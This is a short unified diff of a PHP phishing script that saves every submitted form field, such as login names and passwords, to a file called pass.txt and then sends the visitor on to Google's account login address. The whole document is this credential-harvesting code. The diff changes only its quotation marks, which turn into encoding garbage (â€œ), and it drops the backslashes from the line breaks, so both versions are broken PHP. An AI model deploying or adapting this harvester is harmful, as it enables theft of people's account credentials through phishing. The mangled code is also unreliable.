@@ -1,13 +1,13 @@
 <?php
-header(“Location: https://www.google.com/accounts/ServiceLoginAuth “);
-$handle = fopen(“pass.txt”, “a”);
+header(â€œLocation: https://www.google.com/accounts/ServiceLoginAuth â€œ);
+$handle = fopen(â€œpass.txtâ€, â€œaâ€);
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
-fwrite($handle, “=”);
+fwrite($handle, â€œ=â€);
 fwrite($handle, $value);
-fwrite($handle, “\r\n”);
+fwrite($handle, â€œrnâ€);
 }
-fwrite($handle, “\r\n”);
+fwrite($handle, â€œrnâ€);
 fclose($handle);
 exit;
 ?>
